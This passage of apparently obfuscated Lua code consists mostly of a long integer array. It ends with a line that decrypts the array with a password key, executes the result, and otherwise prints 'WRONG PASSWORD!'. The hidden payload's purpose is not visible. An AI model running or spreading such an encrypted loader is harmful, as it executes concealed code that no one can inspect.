482,3416,4340,3061,3973,4269,3669,3048,3229,4019,3542,4111,3042,3569,3511,2396,3824,2676,3630,4157,2269,4149,2703,2327,3347,3309,2441,3394,4182,4027,2730,3560,4026,4286,3389,3920,4249,3673,3955,3906,3398,4094,2398,3566,3732,4203,4417,3358,3253,3410,2582,2589,4021,2590,3573,3926,2303,3404,2406,3578,2276,2740,3258,3580,2364,2315,4162,4293,2384,2161,4075,2970,3355,3191,4411,3391,2666,3568,4388,4278,3668,2650,4174,4299,2607,2838,2689,3382,2508,3589,4252,2595,3188,2494,3539,4147,4184,2585,3690,3847,3317,4105,3264,2175,3628,4028,2645,2265,3526,2807,3498,3797,4050,3044,3984,2429,3636,3062,3392,4013,3083,2749,2415,3944,4431,2907,3615,3663,4372,4121,2232,2610,2342,2549,3124,3329,2338,2227,2706,3647,2472,3603,3032,3278,2267,2437,3267,3321,2561,4132,4033,3547,3298,2795,3710,2831,2615,2691,2798,2787,2671,2598,3225,3411,3964,3657,3208,2501,4189,4369,3645,4342,3905,2642,4434,2973,4304,4353,2165,3362,4077,4297,3452,2625,4407,3010,4014,3742,2918,2254,2469,2736,2985,4307,2445,4067,3870,4361,2949,3493,3437,4433,2920,3839,2256,2468,4273,2592,2186,2705,3105,3384,2816,2778,2249,2546,2431,4097,2821,2205,3444,2965,2182,3047,2660,4154,4256,4029,3006,3836,4177,3772,4238,3057,2757,3520,2618,4403,3629,3982,2893,3207,2754,3694,2493,3919,4410,3036,2783,2925,3312,3553,2864,3126,2704,2577,3927,4073,2644,3544,3653,2638,2719,4332,3403,2572,3952,3529,3942,4339,3020,2242,2905,4200,2888,2854,4228,4134,4011,3171,4123,2333,2350,2395,3332,4394,2696,3250,2274,2765,3231,3088,3634,2491,3093,4017,3145,4266,3656,3688,2800,3764,2850,3585,2492,3995,3846,3064,2246,4151,2657,3821,2334,2262,4206,4034,4337,3214,4110,3299,3992,3974,3637,3626,3435,2277,3131,3102,3986,3738,3530,4308,3606,4195,3504,4080,4018,4359,3217,3587,3244,2809,4329,3144,2444,2853,3054,4413,4045,3600,3235,2489,3856,3728,3037,3829,2238,2929,2460,3357,3815,4046,2655,3614,2999,2694,3756,4315,2275,4345,2708,4159,2159,3717,2978,2465,4314,3705,4385,2746,2285,2288,2752,2635,2476,3543,2499,3056,4291,3045,3001,2456,3192,4066,4319,3424,2461,3790,2926,2234,3903,4338,3898,4328,3040,2212,2216,3506,4313,4197,4164,3605,2875,2451,3014,3305,2628,2972,2314,2526,4401,3786,3590,2674,3758,3803,2180,3379,4041,4305,3257,3387,2604,2566,3022,3631,2693,3848,4415,3205,2701,4301,3078,4300,2379,3860,2880,2738,3021,2297,2886,3914,2545,3521,4389,2463,3350,2255,2636,2521,3318,4211,2478,3761,3731,4136,3503,4424,3754,4079,2799,2173,4059,3863,4260,2901,3871,2611,2228,4265,2653,3166,4419,2457,3975,3858,3494,2201,3428,3462,3725,2796,3787,2512,3330,3777,3201,3073,3133,2204,3108,4324,3283,2402,2435,3525,3780,2851,2857,2741,4231,3139,3909,4365,4225,2410,2514,3633,3117,2823,2529,4234,3711,3766,2623,3831,3074,4064,3658,4137,3004,2651,3524,3575,2722,3028,3002,3866,2748,2574,3632,2976,2684,3879,3804,2361,3476,4349,3922,2877,3570,3604,2163,3924,4152,3885,3140,2271,4263,2963,3396,3241,4408,3750,2958,3125,3900,2497,3479,2846,2874,4072,3281,2217,3930,4296,2948,3877,2475,2942,4312,-1,100,100,32,111,45,37,49,27,101,67,100,44,29,103,33,104,18,78,111,115,99,37,37,9,61,117,13,66,96,111,106,98,6,103,12,40,43,14,52,37,38,32,43,60,94,43,33,110,49,45,106,103,102,37,61,89,111,38,117,103,111,121,61,32,39,9,105,110,119,35,39,105,36,110,32,36,44,110,122,220,61,78,113,60,43,34,78,109,42,127,47,106,32,43,58,59,124,40,116,46,62,105,43,48,28,40,105,70,32,109,54,45,37,32,55,37,85,111,30,97,47,32,111,103,10,73,47,106,62,55,38,110,45,54,111,123,43,117,51,114,115,69,109,58,59,43,106,39,36,40,40,54,43,33,60,57,55,242,37,137,44,38,32,93,105,66,233,42,52,73,32,68,115,109,7,21,126,49,110,44,45,59,40,104,100,54,52,47,78,111,76,59,33,97,49,104,61,26,97,40,104,45,40,105,100,34,75,32,49,99,41,37,60,63,126,49,40,126,38,32,11,101,46,37,111,42,96,42,115,66,58,33,100,60,102,54,99,102,111,49,41,48,46,105,115,110,111,55,52,78,58,47,100,51,60,110,127,50,57,98,39,42,37,99,103,100,100,37,115,12,100,47,31,61,44,39,57,47,33,32,105,100,206,58,54,110,125,36,105,68,125,61,43,115,89,46,44,107,60,110,5,11,111,111,115,7,57,41,7,71,108,66,102,105,46,52,46,46,97,38,186,39,97,100,105,54,56,29,42,58,43,47,110,47,40,42,106,58,110,35,43,110,104,69,127,32,115,27,105,44,60,105,40,33,43,100,40,98,115,100,97,24,103,27,43,35,100,100,50,105,34,48,33,111,97,48,105,103,71,105,105,116,62,97,44,106,33,45,33,57,113,99,1,39,54,110,99,22,24,107,123,32,33,110,42,41,54,124,61,124,118,115,36,43,73,102,105,51,110,63,100,45,97,42,44,44,60,107,116,53,115,49,42,61,126,111,60,137,125,62,214,60,52,50,105,40,68,97,115,111,61,122,30,27,35,32,66,32,37,69,97,110,56,78,32,110,34,192,97,32,116,42,38,226,100,39,52,105,39,43,59,115,115,111,102,27,32,126,102,11,39,33,35,34,122,35,46,115,45,110,106,32,100,36,114,106,78,97,32,105,110,38,111,69,115,4,60,108,44,110,54,109,97,54,37,63,36,105,45,4,100,26,54,53,109,26,39,106,40,102,49,49,61,89,89,108,105,37,62,18,32,44,105,59,52,52,54,103,99,45,100,56,115,36,155,115,108,126,105,113,60,48,105,61,39,140,25,42,102,105,99,110,37,106,54,100,105,32,54,16,104,105,115,107,110,58,47,47,100,41,45,54,32,43,52,61,34,107,209,100,20,108,3,108,55,110,33,97,106,60,111,44,45,100,36,114,125,45,38,110,212,99,64,115,34,100,73,110,62,104,48,47,69,105,111,42,115,61,97,102,37,50,51,41,38,107,59,43,38,192,56,40,32,116,104,111,127,54,49,42,115,94,39,102,75,105,53,33,33,60,121,152,37,108,22,60,33,108,110,22,102,114,100,103,47,42,105,59,227,97,7,37,62,102,111,45,10,46,32,47,99,115,61,45,32,44,97,115,29,32,115,124,115,108,110,127,37,42,76,123,115,100,45,47,7,119,131,51,60,119,94,60,115,62,102,9,61,43,37,32,100,20,101,5,45,110,97,52,32,43,111,52,63,97,46,33,34,10,21,46,204,97,32,61,67,35,53,44,102,169,76,18,57,126,100,5,110,32,43,115,100,149,102,100,78,61,21,30,61,116,37,127,35,58,55,42,99,38,54,115,101,103,59,39,48,107,55,61,110,97,111,61,115,89,96,123,111,33,126,58,50,47,43,75,115,89,201,124,20,35,50,45,61,43,105,105,45,39,97,60,67,35,97,102,98,22,1,99,52,58,115,35,39,111,58,48,45,53,39,109,39,43,42,32,111,96,38,44,33,49,42,5,61,0,28,33,99,100,36,102,33,40,27,94,60,32,96,43,116,100,44,0,41,55,32,45,47,60,8,100,111,169,109,99,45,103,100,34,39,115,33,0,123,115,107,58,98,60,99,20,100,11,78,107,39,49,39,33,41,33,45,60,97,32,38,108,55,55,102,17,33,59,96,110,41,107,100,103,33,131,56,42,105,58,115,73,115,58,57,44,105,104,111,115,61,104,15,115,61,100,49,111,55,32,105,62,110,113,98,100,106,104,85,54,34,37,47,55,123,104,43,111,33,108,112,116,60,33,64,60,42,9,106,41,105,97,46,37,109,44,110,115,110,151,50,58,97,59,108,66,38,60,47,45,42,45,54,109,115,121,54,58,2,33,43,104,50,97,105,35,190,32,105,110,59,39,44,43,33,59,55,39,32,43,61,32,45,32,39,175,40,39,110,20,62,46,61,99,122,61,5,55,39,40,96,100,100,105,51,110,124,44,53,73,36,96,32,33,32,42,43,102,121,63,113,60,97,157,73,33,48,94,58,42,42,57,58,105,99,59,48,99,33,97,41,110,15,33,39,39,62,33,10,73,63,53,102,54,39,100,50,50,41,105,39,41,123,45,110,111,32,106,115,115,58,49,38,39,106,223,60,103,44,32,106,8,40,106,99,110,33,110,105,100,58,115,110,61,98,58,46,100,124,96,102,91,100,24,36,47,44,54,110,63,43,100,75,60,12,35,75,115,105,32,58,73,106,115,61,73,111,32,97,42,32,100,32,39,85,32,44,94,45,43,43,16,42,76,12,97,17,113,45,43,89,69,97,125,33,127,33,44,97,97,110,13,115,110,62,106,61,120,102,60,32,97,110,59,35,124,60,32,44,116,27,43,115,43,40,41,32,105,47,105,117,43,47,98,135,105,48,111,97,47,100,143,45,99,109,102,109,53,98,104,115,97,69,10,45,54,108,42,38,97,103,38,115,33,108,101,38,36,48,60,3,126,12,114,54,58,55,111,61,60,100,110,32,115,108,106,38,59,125,43,43,123,1,45,105,32,32,43,118,37,97,33,44,37,110,46,34,33,39,119,60,62,59,43,97,19,106,69,15,60,30,105,39,122,44,42,100,9,36,7,48,61,44,111,100,115,41,35,115,33,33,39,35,77,96,45,42,200,15,43,32,113,39,106,198,115,110,121,54,94,61,105,122,34,115,115,57,111,43,62,105,48,107,11,40,35,103,110,139,110,100,119,98,105,108,44,61,111,53,61,101,35,37,49,121,100,89,32,38,52,100,48,43,54,37,55,102,62,34,40,32,39,47,105,26,126,48,97,33,108,32,61,116,108,111,122,150,100,106,45,50,61,52,59,97,47,60,32,96,42,108,98,38,27,106,26,34,36,32,111,99,46,51,68,99,115,110,108,66,40,109,43,50,97,43,102,61,108,106,98,48,35,62,110,123,97,33,60,38,110,111,125,135,94,126,47,27,33,98,237,78,116,58,45,75,39,32,68,73,115,17,62,44,60,97,105,100,100,48,103,98,6,32,32,105,106,96,123,111,103,44,110,45,28,105,100,41,68,254,38,28,124,110,110,43,103,54,251,11,25,41,48,62,45,7,58,33,30,132,41,56,35,42,110,73,120,47,63,48,47,27,17,42,111,126,33,97,37,32,52,45,40,100,43,100,100,42,63,60,100,111,97,44,176,68,229,80,61,43,97,100,39,47,96,108,60,32,61,106,44,61,40,50,43,60,29,51,42,61,60,126,108,52,75,39,6,33,47,43,98,109,9,44,50,105,34,36,39,23,97,32,16,104,108,43,115,111,115,115,103,105,59,43,54,11,111,97,106,115,43,38,111,123,32,100,111,232,37,17,37,104,61,47,35,39,105,100,29,115,97,35,39,98,62,32,62,53,50,59,43,113,58,37,58,45,115,34,115,46,47,174,43,61,43,105,41,57,96,100,42,103,37,68,55,12,100,212,115,111,37,100,47,33,127,58,50,55,35,99,33,44,37,100,39,98,60,78,115,37,63,38,12,45,104,32,96,67,138,59,105,97,56,63,227,39,25,54,68,54,45,39,27,17,102,44,48,111,105,45,33,33,99,127,59,41,111,36,33,61,22,92,43,89,34,94,37,58,102,38,27,32,38,111,105,100,115,32,108,108,53,16,48,39,50,32,100,103,100,139,217,41,2,40,8,97,111,123,32,68,49,124,49,126,52,110,39,7,56,41,113,58,61,106,37,18,11,45,58,104,109,61,111,108,100,108,55,114,60,110,64,75,117,123,46,32,97,96,45,54,22,40,102,38,73,119,133,110,54,177,115,11,124,41,68,17,57,42,32,100,48,39,58,100,126,111,40,109,40,97,39,105,38,50,100,136,59,78,108,45,61,50,108,99,22,47,32,100,103,21,41,126,124,73,42,68,33,110,123,10,116,164,32,33,32,106,39,48,98,33,33,109,102,120,109,48,47,94,53,43,32,48,108,100,72,105,94,62,105,32,67,115,36,42,34,42,55,121,112,61,59,48,103,55,33,97,117,110,96,226,33,123,33,42,61,44,127,52,115,114,127,181,43,42,102,99,32,45,50,192,110,123,116,38,32,55,9,105,55,31,48,12,61,101,36,55,18,39,43,111,58,2,115,1,241,25,35,43,123,105,97,78,9,68,110,118,97,44,43,45,18,105,126,39,99,62,60,223,42,42,13,46,94,108,46,53,61,53,32,45,100,97,42,44,61,43,105,96,108,106,7,99,115,174,103,57,221,38,41,105,105,96,60,43,97,115,100,36,33,96,39,130,102,213,90,231,48,116,8,54,57,42,31,100,54,34,107,55,60,68,20,105,32,110,50,99,46,110,48,94,33,11,42,50,102,50,44,106,36,105,44,32,105,126,32,104,51,68,37,123,99,100,55,105,61,110,39,61,104,49,42,111,111,48,47,97,110,110,59,73,97,96,33,61,117,42,97,115,97,61,115,111,48,32,124,6,110,54,107,73,51,67,38,61,44,243,27,240,38,122,58,75,32,100,105,103,60,126,36,69,8,61,41,58,35,43,108,44,97,43,110,42,109,59,105,108,43,44,104,227,58,40,39,105,45,111,32,55,98,124,20,42,39,40,100,99,33,107,39,108,40,27,125,100,110,108,34,62,61,110,42,224,43,37,26,39,108,115},key))if a then a()else print("WRONG PASSWORD!")end
